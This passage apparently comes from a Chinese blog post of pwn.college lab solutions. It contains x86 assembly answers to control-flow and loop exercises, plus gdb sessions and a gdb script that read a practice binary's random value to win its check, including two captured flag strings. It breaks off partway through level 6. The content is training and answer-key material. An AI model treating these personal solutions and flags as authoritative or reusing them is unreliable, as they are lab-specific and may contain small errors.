<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">jmp</span> set_rax<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0x51</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br><span class="hljs-symbol">set_rax:</span>   <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x1</span><br></code></pre></td></tr></table></figure>



<h4 id="24-jump-trampoline"><a href="#24-jump-trampoline" class="headerlink" title="24. jump-trampoline"></a>24. jump-trampoline</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">jmp</span> set_rax<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0x51</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br><span class="hljs-symbol">set_rax:</span>  <br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x403000</span><br>    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rbx</span><br></code></pre></td></tr></table></figure>



<h4 id="25-conditional-jump"><a href="#25-conditional-jump" class="headerlink" title="25. conditional-jump"></a>25. conditional-jump</h4><p>挖草，巨坑的一点！</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x7f454c46</span><br>    <span class="hljs-keyword">je</span> flag_1<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x00005A4D</span><br>    <span class="hljs-keyword">je</span> flag_2<br>    <span class="hljs-keyword">jmp</span> flag_3<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">flag_1:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">12</span>]<br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol">flag_2:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">12</span>]<br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol">flag_3:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">imul</span> <span class="hljs-built_in">eax</span>,[<span class="hljs-built_in">rdi</span>+<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">imul</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">12</span>]<br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol">done:</span><br></code></pre></td></tr></table></figure>

<p>注意的是<code>mov eax, [rdi]</code>，如果用<code>mov rax, [rdi]</code>会出问题，因为会读取<code>rdi</code>地址上的pword，那么永远走的都是else下的语句。服了。</p>
<h4 id="26-indirect-jump"><a href="#26-indirect-jump" class="headerlink" title="26. indirect-jump"></a>26. indirect-jump</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">jg</span> <span class="hljs-meta">default</span><br>    <span class="hljs-keyword">imul</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">8</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> [<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">default:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">jmp</span> [<span class="hljs-built_in">rax</span>]<br></code></pre></td></tr></table></figure>

<p>这里其实也有坑，需要好好把控<code>[]</code>会解析地址。例如下面的exp：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">jg</span> <span class="hljs-meta">default</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rsi</span> + <span class="hljs-built_in">rdi</span> * <span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">default:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rsi</span> + <span class="hljs-number">0x20</span>]<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure>



<h4 id="27-average-loop"><a href="#27-average-loop" class="headerlink" title="27. average-loop"></a>27. average-loop</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbx</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x8</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jg</span> loop_end<br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol">loop_end:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">div</span> <span class="hljs-built_in">rbx</span><br>    <br></code></pre></td></tr></table></figure>

<blockquote>
<p>依然是要注意<code>[]</code>的使用，要认知是取内存指向的值，还是取内存进行加减。</p>
</blockquote>
<h4 id="28-count-non-zero"><a href="#28-count-non-zero" class="headerlink" title="28. count-non-zero"></a>28. count-non-zero</h4><p>感觉主要问题是，我没理解题目的意思。理解后就很简单了。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> loop_end<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, [<span class="hljs-built_in">rdi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> loop_end<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop_end:</span><br><br></code></pre></td></tr></table></figure>



<h4 id="29-string-lower"><a href="#29-string-lower" class="headerlink" title="29. string lower"></a>29. string lower</h4><p>这个还行，一遍过了。还记得系统调用的时候，第一个参数是用<code>rdi</code>存储，第二个参数是用<code>rsi</code>存储</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">jne</span> loop_start<br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>, [<span class="hljs-built_in">rdi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">cl</span>, <span class="hljs-number">0x00</span><br>    <span class="hljs-keyword">je</span> done<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">cl</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">jle</span> exe_1<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol">exe_1:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x403000</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br>    <span class="hljs-keyword">call</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol">done:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">ret</span><br><br></code></pre></td></tr></table></figure>



<h4 id="30-most-common-byte"><a href="#30-most-common-byte" class="headerlink" title="30. most-common-byte"></a>30. most-common-byte</h4><p>这道题卡了半天吧得，主要是对寄存器不熟悉，重复用了一些寄存器，然后导致出现问题，后面用普通寄存器<code>r8~15</code>解决的，普通寄存器也得用，不然变量不够存的。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0x200</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop_count_bytes:</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jge</span> loop_count_bytes_end<br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>, [<span class="hljs-built_in">rdi</span> + <span class="hljs-built_in">rcx</span>]<br>    <span class="hljs-keyword">movzx</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">dl</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">jmp</span> loop_count_bytes<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop_count_bytes_end:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop_find_max:</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">jg</span> loop_find_max_end<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8b</span>, [<span class="hljs-built_in">rbx</span>]<br>    <span class="hljs-keyword">movzx</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">r8b</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdx</span><br>    <span class="hljs-keyword">jle</span> skip_update<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">jmp</span> loop_find_max<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">skip_update:</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">jmp</span> loop_find_max<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop_find_max_end:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">ret</span><br><br></code></pre></td></tr></table></figure>



<h3 id="Debugging-Refresher"><a href="#Debugging-Refresher" class="headerlink" title="Debugging Refresher"></a>Debugging Refresher</h3><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>直接run一下，再continue一下就好了，gdb的简单使用</p>
<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix">(gdb) p<span class="hljs-symbol">/x</span> $r12<br>$<span class="hljs-number">2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x18215a7f83c98b8e<br>(gdb) c<br>Continuing.<br>Random <span class="hljs-params">value:</span> <span class="hljs-number">0</span>x18215a7f83c98b8e<br>You <span class="hljs-params">input:</span> <span class="hljs-number">18215</span>a7f83c98b8e<br>The correct answer <span class="hljs-params">is:</span> <span class="hljs-number">18215</span>a7f83c98b8e<br>You win<span class="hljs-operator">!</span> Here is your <span class="hljs-params">flag:</span><br>pwn.college&#123;ETe5riLiwE1X6xz1M0yCPK4-<span class="hljs-number">4</span>WH.<span class="hljs-number">0</span>VN0IDLxYTN1YzW&#125;<br></code></pre></td></tr></table></figure>



<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>通过在read处打断点，然后执行到read函数时，查看寄存器信息。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">(gdb) info registers <br><span class="hljs-built_in">rax</span>            <span class="hljs-number">0x7fff17b9e998</span>      <span class="hljs-number">140733591447960</span><br><span class="hljs-built_in">rbx</span>            <span class="hljs-number">0x5f31bbc71d10</span>      <span class="hljs-number">104667208424720</span><br><span class="hljs-built_in">rcx</span>            <span class="hljs-number">0x3</span>                 <span class="hljs-number">3</span><br><span class="hljs-built_in">rdx</span>            <span class="hljs-number">0x8</span>                 <span class="hljs-number">8</span><br><span class="hljs-built_in">rsi</span>            <span class="hljs-number">0x7fff17b9e998</span>      <span class="hljs-number">140733591447960</span><br><span class="hljs-built_in">rdi</span>            <span class="hljs-number">0x3</span>                 <span class="hljs-number">3</span><br><span class="hljs-built_in">rbp</span>            <span class="hljs-number">0x7fff17b9e9b0</span>      <span class="hljs-number">0x7fff17b9e9b0</span><br><span class="hljs-built_in">rsp</span>            <span class="hljs-number">0x7fff17b9e968</span>      <span class="hljs-number">0x7fff17b9e968</span><br><span class="hljs-built_in">r8</span>             <span class="hljs-number">0x3d</span>                <span class="hljs-number">61</span><br><span class="hljs-built_in">r9</span>             <span class="hljs-number">0x2c</span>                <span class="hljs-number">44</span><br><span class="hljs-built_in">r10</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0</span><br><span class="hljs-built_in">r11</span>            <span class="hljs-number">0x246</span>               <span class="hljs-number">582</span><br><span class="hljs-built_in">r12</span>            <span class="hljs-number">0x5f31bbc712a0</span>      <span class="hljs-number">104667208422048</span><br><span class="hljs-built_in">r13</span>            <span class="hljs-number">0x7fff17b9eaa0</span>      <span class="hljs-number">140733591448224</span><br><span class="hljs-built_in">r14</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0</span><br><span class="hljs-built_in">r15</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0</span><br><span class="hljs-built_in">rip</span>            <span class="hljs-number">0x5f31bbc71210</span>      <span class="hljs-number">0x5f31bbc71210</span> &lt;read@plt&gt;<br>eflags         <span class="hljs-number">0x202</span>               [ IF ]<br></code></pre></td></tr></table></figure>

<p><code>rsi</code>作为read系统调用的buf参数，所以在随机数被set后，读取这个地址的值即可。（我发现不能断点给到read函数，因为从main中执行到read的时候，有其他函数会调用read，然后就会导致它read一直失败报错）</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gams">(gdb) c<br>Continuing.<br>The random value has been <span class="hljs-keyword">set</span>!<br><br><br>Program <span class="hljs-comment">received signal SIGTRAP, Trace</span>/breakpoint trap.<br><span class="hljs-number">0x00005f31bbc71c64</span> in main ()<br>(gdb) x /<span class="hljs-comment">8x 0x7fff17b9e998</span><br>0x7fff17b9e998: 0xd81c082e      <span class="hljs-comment">0xc0e7d841      0x17b9eaa0      0x00007fff</span><br>0x7fff17b9e9a8: 0x34e94700      <span class="hljs-comment">0xa2fdab81      0x00000000      0x00000000</span><br>(gdb) c<br>Continuing.<br>Random <span class="hljs-comment">value: c0e7d841d81c082e</span><br>You <span class="hljs-comment">input: c0e7d841d81c082e</span><br>The <span class="hljs-comment">correct answer is: c0e7d841d81c082e</span><br>You <span class="hljs-comment">win! Here is your flag:</span><br><br>Breakpoint <span class="hljs-comment">1, 0x00005f31bbc71210 in read@plt ()</span><br>(gdb) c<br>Continuing.<br>pwn.college&#123;s102MI2GzaSB-30x2SjuMIlWzDy.0lN0IDLxYTN1YzW&#125;<br><br><br>[Inferior <span class="hljs-comment">1 (process 4714) exited normally]</span><br></code></pre></td></tr></table></figure>

<p>没毛病！至于为什么这个随机值是反着的，存储的是小端序，手动改成大端序才行。而且输出是以4字节为单位的，所以只需要将八字节反向一下即可。类似地，以一个字节为单位输出，也可以手动转换</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">(gdb) x /8x <span class="hljs-number">0x7ffccd2aa938</span><br><span class="hljs-number">0x7ffccd2aa938</span>: <span class="hljs-number">0x30</span>    <span class="hljs-number">0xe5</span>    <span class="hljs-number">0x4d</span>    <span class="hljs-number">0x5b</span>    <span class="hljs-number">0xce</span>    <span class="hljs-number">0xe0</span>    <span class="hljs-number">0x9a</span>    <span class="hljs-number">0x51</span><br>(gdb) 519ae0ce5b4de530<br></code></pre></td></tr></table></figure>

<p>**PS：**在后续的学习中，发现可以使用x&#x2F;gx 以8字节为单位输出</p>
<h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><p>我也不知道是不是我第三关的方法用错了，第四关就是使用第三关的方法，一直重复，一直读取read系统调用时<code>rsi</code>寄存器的那个地址，并且在<code>scanf</code>系统调用前打个断点，这样方便我们读取这个随机值。重复5次还是几次就能拿到flag了。</p>
<h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><p>使用gdb脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">start</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">704</span><br>commands<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rsi_buf</span> = <span class="hljs-variable">$rsi</span><br>    printf <span class="hljs-string">&quot;buf_addr value: %llx\n&quot;</span>, <span class="hljs-variable">$rsi_buf</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">752</span><br>commands<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$local_variable</span> = *(unsigned long long*)(<span class="hljs-variable">$rsi_buf</span>)<br>    printf <span class="hljs-string">&quot;Random value: %llx\n&quot;</span>, <span class="hljs-variable">$local_variable</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<p>呃，这个脚本不是完全的自动化，但是手动复制输入给程序，重复几次后就能获得到flag了。但是实际上应该是可以做到自动化输入的，或许可以借助python脚本来写，或者直接改内存。</p>
<h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h4><p>改寄存器的值做不到哇，<code>scanf</code>函数是通过调用多次<code>read</code>系统调用，每次都只写入<strong>1个字节</strong></p>
<p>我麻了，尝试那么多次。实际上应该跳过scanf,而不是重定向标准输入。只需要获取scanf所读取的内存地址，在这个地址将那个随机值放进去，然后控制<code>rip</code>寄存器，跳过scanf就好了。用一下exp会出现一个问题：</p>
